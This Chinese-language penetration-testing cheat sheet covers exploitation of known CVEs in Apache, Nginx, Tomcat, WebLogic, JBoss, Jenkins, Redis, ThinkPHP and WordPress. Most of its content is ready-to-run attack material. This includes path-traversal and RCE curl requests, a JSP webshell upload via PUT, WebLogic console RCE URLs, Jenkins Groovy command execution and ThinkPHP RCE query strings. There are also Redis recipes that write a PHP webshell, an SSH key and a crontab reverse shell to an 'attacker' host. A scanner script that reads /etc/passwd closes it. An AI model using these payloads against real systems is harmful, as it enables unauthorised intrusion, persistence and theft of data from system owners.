# 🔧 组件漏洞利用模块

## 适用场景
- 已知 CVE 漏洞利用
- 中间件漏洞
- CMS/框架漏洞

## 检查清单

```yaml
信息收集:
  - [ ] 版本识别
  - [ ] 技术栈识别
  - [ ] CVE 搜索

常见组件:
  - [ ] Tomcat
  - [ ] Nginx
  - [ ] Apache
  - [ ] IIS
  - [ ] WebLogic
  - [ ] JBoss
  - [ ] Jenkins
  - [ ] Redis
  - [ ] MySQL
  - [ ] MongoDB

常见 CMS:
  - [ ] WordPress
  - [ ] Drupal
  - [ ] ThinkPHP
  - [ ] Laravel
  - [ ] Django
```

## 版本识别

### 手工识别

```bash
# HTTP 响应头
curl -I http://target.com
# Server: Apache/2.4.49
# X-Powered-By: PHP/7.4.3

# 特定路径
curl http://target.com/readme.txt
curl http://target.com/CHANGELOG.txt
curl http://target.com/version.txt

# 错误页面
curl http://target.com/notexist

# 特征文件
# WordPress: /wp-includes/version.php
# Drupal: /core/install.php
# ThinkPHP: 报错信息
```

### 工具识别

```bash
# Wappalyzer (浏览器插件)
# WhatWeb
whatweb http://target.com

# Nmap
nmap -sV -p80 target.com

# Nuclei
nuclei -u http://target.com -t technologies/
```

#### 无工具替代方案
```bash
# 手工检测
# 1. 查看响应头
curl -I http://target.com

# 2. 查看源码中的特征
curl http://target.com | grep -iE "generator|powered|version"

# 3. 尝试常见路径
curl http://target.com/robots.txt
curl http://target.com/readme.html
curl http://target.com/license.txt

# 4. 触发错误查看信息
curl "http://target.com/index.php?id='"

# 在线识别
# https://www.wappalyzer.com/lookup/
# https://builtwith.com/
```

## 常见漏洞

### Apache

```bash
# CVE-2021-41773 / CVE-2021-42013 (Apache 2.4.49-2.4.50)
# 路径遍历 + RCE
curl "http://target.com/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"
curl "http://target.com/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd"

# RCE (需要 mod_cgi 启用)
curl -X POST "http://target.com/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" -d "echo; id"

# CVE-2019-0211 (Apache 2.4.17-2.4.38)
# 权限提升

# CVE-2017-15715
# 文件上传绕过 (filename 以 \x0d 结尾)
```

### Nginx

```bash
# 目录遍历 (配置错误)
# location /files { alias /data/; }
# 访问 /files../etc/passwd

# CRLF 注入
curl "http://target.com/%0d%0aSet-Cookie:%20malicious=value"

# CVE-2017-7529 (范围过滤器整数溢出)
curl -H "Range: bytes=-17208,-9223372036854750001" http://target.com/
```

### Tomcat

```bash
# CVE-2020-1938 (Ghostcat, AJP)
# AJP 协议文件读取/包含
python ajpShooter.py http://target.com 8009 /WEB-INF/web.xml read

# CVE-2017-12615/12617
# PUT 方法上传
curl -X PUT "http://target.com/shell.jsp/" -d "<%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>"
curl -X PUT "http://target.com/shell.jsp::$DATA" -d ...  # Windows

# Manager 弱口令
# 默认路径: /manager/html
# 常见凭证: admin/admin, tomcat/tomcat, manager/manager
```

### WebLogic

```bash
# CVE-2019-2725 / CVE-2019-2729
# 反序列化 RCE
# 路径: /_async/AsyncResponseService

# CVE-2020-14882 (未授权远程代码执行)
curl "http://target.com:7001/console/css/%252e%252e%252fconsolehelp/integration/tools/weblogic.work.ViewWorkContext"

# CVE-2020-14883 (配合 14882)
curl "http://target.com:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27id%27);%22)"

# T3 协议反序列化
# 使用专用工具检测
```

### JBoss

```bash
# CVE-2017-12149 (反序列化)
# 路径: /invoker/readonly

# JMX Console 未授权
# 路径: /jmx-console/
# /jmx-console/HtmlAdaptor?action=invokeOp&name=jboss.admin:service=DeploymentFileRepository...

# Web Console 部署
# 路径: /web-console/
```

### Jenkins

```bash
# 未授权访问
# /script - Script Console (Groovy)
# /computer/... - 节点管理

# Groovy RCE
println "id".execute().text
def cmd = "id"
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout

# CVE-2019-1003000 / CVE-2018-1000861
# 沙箱绕过
```

### Redis

```bash
# 未授权访问
redis-cli -h target.com
INFO
CONFIG GET dir

# 写 WebShell
CONFIG SET dir /var/www/html
CONFIG SET dbfilename shell.php
SET x "<?php @eval($_POST['cmd']); ?>"
SAVE

# 写 SSH 公钥
CONFIG SET dir /root/.ssh
CONFIG SET dbfilename authorized_keys
SET x "\n\nssh-rsa AAAAB3... user@host\n\n"
SAVE

# 写 Crontab
CONFIG SET dir /var/spool/cron
CONFIG SET dbfilename root
SET x "\n\n*/1 * * * * bash -i >& /dev/tcp/attacker/4444 0>&1\n\n"
SAVE

# 主从复制 RCE
# 使用 redis-rogue-server 工具
```

### ThinkPHP

```bash
# ThinkPHP 5.x RCE
# 5.0.x
?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id

# 5.1.x / 5.2.x
?s=index/\think\Request/input&filter=system&data=id
?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
?s=index/\think\template\driver\file/write&cacheFile=shell.php&content=%3C?php%20phpinfo();?%3E

# ThinkPHP 3.x
?m=Home&c=Index&a=index&value[_filename]=./Application/Runtime/Logs/Home/21_01_01.log
# 先写入日志再包含

# ThinkPHP 6.x
# 使用 session 文件包含
```

### WordPress

```bash
# 常见路径
/wp-login.php
/wp-admin/
/xmlrpc.php

# 用户枚举
/?author=1
/wp-json/wp/v2/users

# xmlrpc 爆破
# 可以同时测试多个密码

# 插件漏洞
# 使用 WPScan 检测
wpscan --url http://target.com

# 常见漏洞插件
# W3 Total Cache
# Yoast SEO
# Contact Form 7
```

## CVE 搜索与利用

```bash
# 搜索 CVE
# https://cve.mitre.org/
# https://nvd.nist.gov/
# https://www.exploit-db.com/
# https://vulhub.org/

# 查找 EXP
searchsploit apache 2.4.49
searchsploit -m 50383  # 下载 exploit

# GitHub 搜索
# "CVE-2021-44228 poc"
# "log4j exploit"

# Nuclei 模板
nuclei -u http://target.com -t cves/
```

#### 无工具替代方案
```bash
# 手工搜索
# 1. Google 搜索: "组件名称 版本号 exploit"
# 2. GitHub 搜索: "CVE-xxxx-xxxx"
# 3. Exploit-DB: https://www.exploit-db.com/

# 在线测试
# 使用 curl 手工构造请求
curl -X POST -d "payload" http://target.com/vulnerable_path

# 常见 POC 网站
# https://github.com/projectdiscovery/nuclei-templates
# https://github.com/vulhub/vulhub
# https://www.exploit-db.com/
```

## 漏洞验证脚本

```python
#!/usr/bin/env python3
"""
通用 CVE 检测脚本模板
"""

import requests
import sys

def check_vuln(url):
    """检测漏洞"""
    
    # Apache CVE-2021-41773
    payloads = [
        "/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd",
        "/icons/.%2e/.%2e/.%2e/.%2e/etc/passwd",
    ]
    
    for payload in payloads:
        try:
            resp = requests.get(url + payload, timeout=5)
            if "root:" in resp.text:
                print(f"[+] Vulnerable: {payload}")
                print(resp.text[:500])
                return True
        except Exception as e:
            print(f"[-] Error: {e}")
    
    return False

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("Usage: python3 check_vuln.py http://target.com")
        sys.exit(1)
    
    check_vuln(sys.argv[1])
```

## 工具速查

```bash
# 版本识别
whatweb http://target.com
wappalyzer (浏览器插件)

# 漏洞扫描
nuclei -u http://target.com
nmap --script=vuln target.com

# Exploit 搜索
searchsploit <keyword>

# CMS 扫描
wpscan --url http://target.com  # WordPress
droopescan scan drupal -u http://target.com  # Drupal

# 在线资源
# https://vulhub.org/ - 漏洞环境
# https://www.exploit-db.com/ - EXP 数据库
# https://github.com/projectdiscovery/nuclei-templates - Nuclei 模板
```
